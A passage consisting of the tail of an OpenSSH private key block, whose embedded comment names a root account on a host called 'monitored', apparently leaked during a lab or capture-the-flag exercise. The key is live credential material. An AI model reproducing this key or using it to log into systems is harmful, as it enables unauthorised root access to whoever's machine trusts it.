uOfu2/s0gyiKJVZBqIAOm9sHXuRN8JBxw1F326cECqVEafaABB31BkgyaelW6JOe3up0vc
OJo9uEeLo4OPDV8zMmPPLoY9x8A8YtPe3THDfFryFc3Pv5Az1AD5vpf/MPPfTMUyGa1err
+P4icj4itS7Rz34UbhSN8Xukn8u//1MRmZrIYtt5r2rz2ematKiDprzU7te1ecIOWgCE1C
dFWPcbiIbcCABUn4BgBeDBfz/sxWEJGCzqslZvvtoWW0i0cDMpieYkpiKOKZW8T4xmU1ie
zv6Z183OYfNzdhUhtPkuEpprcz3xp7cXIr9o/he06DHzE3ezaff5Sb92G/Cf5sT9qpw02i
OUI2ZskSVN25OKpPbIU5zqV2Bp9P4QAAAAMBAAEAAAGAWkfuAQEhxt7viZ9sxbFrT2sw+R
reV+o0IgIdzTQP/+C5wXxzyT+YCNdrgVVEzMPYUtXcFCur952TpWJ4Vpp5SpaWS++mcq/t
PJyIybsQocxoqW/Bj3o4lEzoSRFddGU1dxX9OU6XtUmAQrqAwM+++9wy+bZs5ANPfZ/EbQ
qVnLg1Gzb59UPZ51vVvk73PCbaYWtIvuFdAv71hpgZfROo5/QKqyG/mqLVep7mU2HFFLC3
dI0UL15F05VToB+xM6Xf/zcejtz/huui5ObwKMnvYzJAe7ViyiodtQe5L2gAfXxgzS0kpT
/qrvvTewkKNIQkUmCRvBu/vfaUhfO2+GceGB3wN2T8S1DhSYf5ViIIcVIn8JGjw1Ynr/zf
FxsZJxc4eKwyvYUJ5fVJZWSyClCzXjZIMYxAvrXSqynQHyBic79BQEBwe1Js6OYr+77AzW
8oC9OPid/Er9bTQcTUbfME9Pjk9DVU/HyT1s2XH9vnw2vZGKHdrC6wwWQjesvjJL4pAAAA
wQCEYLJWfBwUhZISUc8IDmfn06Z7sugeX7Ajj4Z/C9Jwt0xMNKdrndVEXBgkxBLcqGmcx7
RXsFyepy8HgiXLML1YsjVMgFjibWEXrvniDxy2USn6elG/e3LPok7QBql9RtJOMBOHDGzk
ENyOMyMwH6hSCJtVkKnUxt0pWtR3anRe42GRFzOAzHmMpqby1+D3GdilYRcLG7h1b7aTaU
BKFb4vaeUaTA0164Wn53N89GQ+VZmllkkLHN1KVlQfszL3FrYAAADBAMuUrIoF7WY55ier
050xuzn9OosgsU0kZuR/CfOcX4v38PMI3ch1IDvFpQoxsPmGMQBpBCzPTux15QtQYcMqM0
XVZpstqB4y33pwVWINzpAS1wv+I+VDjlwdOTrO/DJiFsnLuA3wRrlb7jdDKC/DP/I/90bx
1rcSEDG4C2stLwzH9crPdaZozGHXWU03vDZNos3yCMDeKlLKAvaAddWE2R0FJr62CtK60R
wL2dRR3DI7+Eo2pDzCk1j9H37YzYHlbwAAAMEAxim0OTlYJOWdpvyb8a84cRLwPa+v4EQC
GgSoAmyWM4v1DeRH9HprDVadT+WJDHufgqkWOCW7x1I/K42CempxM1zn1iNOhE2WfmYtnv
2amEWwfnTISDFY/27V7S3tpJLeBl2q40Yd/lRO4g5UOsLQpuVwW82sWDoa7KwglG3F+TIV
csj0t36sPw7lp3H1puOKNyiFYCvHHueh8nlMI0TA94RE4SPi3L/NVpLh3f4EYeAbt5z96C
CNvArnlhyB8ZevAAAADnJvb3RAbW9uaXRvcmVkAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```